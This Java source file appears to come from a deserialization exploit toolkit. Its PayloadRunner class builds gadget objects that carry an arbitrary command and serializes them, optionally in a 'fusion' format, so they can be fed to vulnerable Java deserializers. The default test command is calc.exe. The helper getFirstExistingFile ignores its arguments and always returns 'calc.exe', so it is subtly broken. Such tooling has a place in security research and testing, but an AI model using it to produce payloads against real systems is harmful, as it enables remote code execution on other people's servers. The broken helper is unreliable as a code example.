package util;

import common.Serializerable;
import common.secmgr.ExecCheckingSecurityManager;
import payloads.face.ObjectPayload.Utils;
import payloads.face.*;

import java.util.concurrent.Callable;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static byte[] run(final Class<? extends ObjectPayload<?>> clazz, final String command, final boolean fusion) throws Exception {
		return new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
			public byte[] call() throws Exception {
				ObjectPayload<?> payload = clazz.newInstance();
				final Object objBefore = payload.getObject(command);
				byte[] ser = new byte[]{};
				if (fusion){
					ser = Serializerable.serializeFusion(objBefore);
				}else {
					ser = Serializerable.serialize(objBefore);
				}

				Utils.releasePayload(payload, objBefore);
				return ser;
			}
		});
	}


    private static String getDefaultTestCmd() {
	    return getFirstExistingFile(
	        "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String ... files) {
        return "calc.exe";
    }
}
